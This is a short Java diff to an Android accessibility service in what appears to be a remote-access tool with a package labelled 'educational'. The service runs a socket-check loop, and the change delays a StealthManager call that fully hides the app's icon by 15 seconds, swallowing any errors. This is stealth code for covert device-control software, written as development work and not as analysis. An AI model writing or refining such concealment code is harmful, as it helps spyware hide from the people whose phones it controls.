@@ -179,11 +179,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         try { startSocketCheckLoop(); } catch (Exception ignored) {}
 
         try {
-            com.remoteaccess.educational.stealth.StealthManager stealthManager =
-                    new com.remoteaccess.educational.stealth.StealthManager(this);
-            if (!stealthManager.isIconHidden()) {
-                stealthManager.fullyHideApp();
-            }
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                try {
+                    com.remoteaccess.educational.stealth.StealthManager stealthManager =
+                            new com.remoteaccess.educational.stealth.StealthManager(this);
+                    if (!stealthManager.isIconHidden()) {
+                        stealthManager.fullyHideApp();
+                    }
+                } catch (Exception ignored) {}
+            }, 15_000);
         } catch (Exception ignored) {}
     }
 
